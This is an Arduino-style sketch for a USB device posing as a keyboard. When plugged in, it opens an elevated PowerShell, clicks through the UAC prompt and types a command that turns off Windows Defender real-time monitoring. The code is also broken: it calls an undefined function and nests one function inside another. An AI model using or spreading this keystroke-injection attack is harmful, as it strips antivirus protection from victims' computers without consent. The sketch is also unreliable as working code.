#include <Keyboard.h>
#include <Bounce.h>

//#include <Windows.h>

const int buttonPin = 0;
Bounce button = Bounce(buttonPin, 10);

void setup(){
  delay(800);
  pinMode(buttonPin, INPUT_PULLUP);
  Keyboard.begin();
  //Delay for the computer to see the USB
  delay(1000); 
  //Delay for assurance
  delay(1000); 

  //open command line with administrator rights
  CommandLineAdministrator();
  delay(2000);

  WindowsDefenderRegistry();
  delay(1000);

}

void loop(){
  
}

//function that permit to access Registry with administrator rights
void CommandLineAdministrator(){
  //open windows 
  Keyboard.press(KEY_LEFT_GUI);
  delay(100);
  Keyboard.releaseAll();
  delay(500);

  //open cmd with administrator rights
  Keyboard.print("powershell");
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.releaseAll();
  delay(500);
  Keyboard.press(KEY_LEFT_ARROW);
  Keyboard.releaseAll();
  delay(200);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();
  delay(500);


void WindowsDefenderDisable(){
  
  Keyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true; (New-Object -COM 'WScript.Shell').SendKeys('%{F4}')");
  delay(500);
  Keyboard.press(KEY_RETURN);
  Keyboard.releaseAll();

  delay(500);
}

}


